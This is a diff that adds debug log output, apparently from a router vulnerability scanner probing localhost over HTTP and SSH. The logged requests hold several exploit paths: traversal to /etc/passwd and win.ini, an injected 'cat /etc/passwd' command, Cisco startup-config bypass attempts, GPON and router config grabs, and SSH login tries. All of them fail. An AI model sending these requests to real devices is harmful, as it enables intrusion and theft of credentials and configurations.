@@ -2171,3 +2171,1194 @@
 2019-02-06 20:09:30,374 DEBUG paramiko.transport       EOF in transport thread
 2019-02-06 20:40:29,443 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
 2019-02-06 20:40:29,448 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,170 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,172 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,173 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,174 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,177 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,179 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:30:57,179 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /apply.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:57,180 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /tmUnblock.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:57,180 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /.htpasswd HTTP/1.1" 404 169
+2019-02-24 10:30:57,181 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,182 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /HNAP1/ HTTP/1.1" 404 169
+2019-02-24 10:30:57,183 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,186 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,187 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,190 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,191 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,192 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /debug.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:57,194 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,195 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:30:57,196 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/authorize.asp HTTP/1.1" 404 169
+2019-02-24 10:30:57,196 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /UD/act?1 HTTP/1.1" 404 169
+2019-02-24 10:30:57,202 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,202 DEBUG paramiko.transport       starting thread (client mode): 0x9927f898
+2019-02-24 10:30:57,202 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /js/Multi_Language.js HTTP/1.1" 404 169
+2019-02-24 10:30:57,203 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /globe HTTP/1.1" 404 169
+2019-02-24 10:30:57,205 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,207 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,208 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:57,208 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /logo.jpg HTTP/1.1" 404 169
+2019-02-24 10:30:57,210 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,214 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,215 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /goform/system/GatewaySettings.bin HTTP/1.1" 404 169
+2019-02-24 10:30:57,215 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:57,217 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,220 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,220 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:57,220 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /goform/system/GatewaySettings.bin HTTP/1.1" 404 169
+2019-02-24 10:30:57,221 DEBUG paramiko.transport       starting thread (client mode): 0x9924e438
+2019-02-24 10:30:57,222 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /html/password.html HTTP/1.1" 404 169
+2019-02-24 10:30:57,224 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /api/wlan/security-settings HTTP/1.1" 404 169
+2019-02-24 10:30:57,226 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,227 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /UD/?5 HTTP/1.1" 404 169
+2019-02-24 10:30:57,228 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:57,229 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:57,231 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,236 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,238 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,239 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:57,239 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /password.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:57,239 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:57,240 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /error_page.htm HTTP/1.1" 404 169
+2019-02-24 10:30:57,240 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:57,241 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /s_brief.htm HTTP/1.1" 404 169
+2019-02-24 10:30:57,243 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,244 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:57,244 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /SaveCfgFile.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:57,247 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,248 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:57,249 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,249 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:57,250 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /imc/reportscript/sqlserver/deploypara.properties HTTP/1.1" 404 169
+2019-02-24 10:30:57,252 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,252 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:57,253 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:57,253 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwindows%5Cwin.ini HTTP/1.1" 404 169
+2019-02-24 10:30:57,255 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,255 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:57,255 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:57,258 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,258 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /main/config.bin HTTP/1.1" 404 169
+2019-02-24 10:30:57,259 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:57,261 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:57,260 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /rpt/reportscript/sqlserver/deploypara.properties HTTP/1.1" 404 169
+2019-02-24 10:30:57,262 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:57,263 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,264 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,266 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,268 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /main/profile.wlp?PN=ggg HTTP/1.1" 404 169
+2019-02-24 10:30:57,270 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,272 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /imc/reportscript/oracle/deploypara.properties HTTP/1.1" 404 169
+2019-02-24 10:30:57,274 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,275 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /test HTTP/1.1" 404 571
+2019-02-24 10:30:57,277 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,280 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,281 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /main/event.logs HTTP/1.1" 404 169
+2019-02-24 10:30:57,284 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "HEAD /rom-0 HTTP/1.1" 404 0
+2019-02-24 10:30:57,287 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,288 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,289 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,290 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 169
+2019-02-24 10:30:57,290 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:57,292 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /login.stm HTTP/1.1" 404 169
+2019-02-24 10:30:57,295 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,296 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,296 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /SaveCfgFile.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:57,296 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:57,299 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,299 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /login.stm HTTP/1.1" 404 169
+2019-02-24 10:30:57,299 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /rom-0 HTTP/1.1" 404 169
+2019-02-24 10:30:57,301 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /diag.html?images/ HTTP/1.1" 404 169
+2019-02-24 10:30:57,304 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,305 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:57,306 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,307 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:57,308 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /login.stm HTTP/1.1" 404 169
+2019-02-24 10:30:57,309 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/webproc?getpage=/etc/passwd&var:page=deviceinfo HTTP/1.1" 404 169
+2019-02-24 10:30:57,311 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,311 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:57,311 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /login.cgi.php HTTP/1.1" 404 None
+2019-02-24 10:30:57,314 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,317 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:57,318 DEBUG urllib3.connectionpool       Starting new HTTPS connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,318 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /backupsettings.conf HTTP/1.1" 404 169
+2019-02-24 10:30:57,319 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/16/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,323 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,326 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,327 DEBUG paramiko.transport       Trying SSH key b'27c6adf9a64d223f18b03bdf811c5745'
+2019-02-24 10:30:57,328 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /login.cgi?logout=1 HTTP/1.1" 404 169
+2019-02-24 10:30:57,330 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/17/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,332 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,334 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:57,336 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,339 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /filename.gwc HTTP/1.1" 404 169
+2019-02-24 10:30:57,341 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,342 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/18/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,344 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,345 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /ucsm/isSamInstalled.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:57,347 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,348 INFO paramiko.transport       Authentication (password) failed.
+2019-02-24 10:30:57,349 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/19/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,351 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,352 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:57,352 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /ccmivr/IVRGetAudioFile.do?file=../../../../../../../../../../../../../../../etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:30:57,353 DEBUG paramiko.transport       userauth is OK
+2019-02-24 10:30:57,356 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,357 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/20/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,360 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,362 DEBUG paramiko.transport       Authentication type (keyboard-interactive) not permitted.
+2019-02-24 10:30:57,362 DEBUG paramiko.transport       Allowed methods: ['publickey', 'password']
+2019-02-24 10:30:57,364 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,365 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "POST /goform/enhAuthHandler HTTP/1.1" 404 169
+2019-02-24 10:30:57,366 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/21/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,368 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET / HTTP/1.1" 200 612
+2019-02-24 10:30:57,371 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,373 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,374 INFO paramiko.transport       Authentication (publickey) failed.
+2019-02-24 10:30:57,377 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,377 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/22/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,380 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /password.cgi HTTP/1.1" 404 169
+2019-02-24 10:30:57,384 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,386 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,387 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /cgi-bin/script?system%20cat%20/etc/passwd HTTP/1.1" 404 169
+2019-02-24 10:30:57,390 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/23/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,390 DEBUG paramiko.transport       starting thread (client mode): 0x9924eef0
+2019-02-24 10:30:57,391 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /GatewaySettings.bin HTTP/1.1" 404 169
+2019-02-24 10:30:57,394 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,395 DEBUG paramiko.transport       Local version/idstring: SSH-2.0-paramiko_2.4.2
+2019-02-24 10:30:57,396 DEBUG paramiko.transport       Remote version/idstring: SSH-2.0-OpenSSH_7.9
+2019-02-24 10:30:57,397 INFO paramiko.transport       Connected (version 2.0, client OpenSSH_7.9)
+2019-02-24 10:30:57,398 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/24/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,400 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,400 DEBUG paramiko.transport       kex algos:['curve25519-sha256', 'curve25519-sha256@libssh.org', 'ecdh-sha2-nistp256', 'ecdh-sha2-nistp384', 'ecdh-sha2-nistp521', 'diffie-hellman-group-exchange-sha256', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group14-sha256', 'diffie-hellman-group14-sha1'] server key:['rsa-sha2-512', 'rsa-sha2-256', 'ssh-rsa', 'ecdsa-sha2-nistp256'] client encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] server encrypt:['chacha20-poly1305@openssh.com', 'aes128-ctr', 'aes192-ctr', 'aes256-ctr', 'aes128-gcm@openssh.com', 'aes256-gcm@openssh.com'] client mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] server mac:['umac-64-etm@openssh.com', 'umac-128-etm@openssh.com', 'hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'hmac-sha1-etm@openssh.com', 'umac-64@openssh.com', 'umac-128@openssh.com', 'hmac-sha2-256', 'hmac-sha2-512', 'hmac-sha1'] client compress:['none', 'zlib@openssh.com'] server compress:['none', 'zlib@openssh.com'] client lang:[''] server lang:[''] kex follows?False
+2019-02-24 10:30:57,401 DEBUG paramiko.transport       Kex agreed: ecdh-sha2-nistp256
+2019-02-24 10:30:57,401 DEBUG paramiko.transport       HostKey agreed: ecdsa-sha2-nistp256
+2019-02-24 10:30:57,401 DEBUG paramiko.transport       Cipher agreed: aes128-ctr
+2019-02-24 10:30:57,401 DEBUG paramiko.transport       MAC agreed: hmac-sha2-256
+2019-02-24 10:30:57,401 DEBUG paramiko.transport       Compression agreed: none
+2019-02-24 10:30:57,402 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/25/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,404 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,405 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/26/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,407 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,409 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/27/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,411 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,412 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/28/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,414 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,415 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/29/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,425 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,426 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/30/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,428 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,429 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/31/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,431 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,432 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/32/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,434 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,435 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/33/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,438 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,439 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/34/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,441 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,443 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/35/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,445 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,447 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/36/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,450 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,466 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/37/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,468 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,470 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/38/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,472 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,473 DEBUG paramiko.transport       kex engine KexNistp256 specified hash_algo <built-in function openssl_sha256>
+2019-02-24 10:30:57,474 DEBUG paramiko.transport       Switch to new keys ...
+2019-02-24 10:30:57,475 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/39/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,478 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
+2019-02-24 10:30:57,479 DEBUG paramiko.transport       EOF in transport thread
+2019-02-24 10:30:57,479 DEBUG paramiko.transport       Adding ecdsa-sha2-nistp256 host key for 127.0.0.1: b'c72c9d3612bdad35a3308c53a18349fb'
+2019-02-24 10:30:57,481 DEBUG paramiko.transport       Trying SSH key b'dd3bb82e850406e9abffa80ac0046ed6'
+2019-02-24 10:30:57,482 DEBUG urllib3.connectionpool       http://127.0.0.1:80 "GET /level/40/exec/-/show%20startup-config HTTP/1.1" 404 169
+2019-02-24 10:30:57,484 DEBUG urllib3.connectionpool       Starting new HTTP connection (1): 127.0.0.1:80
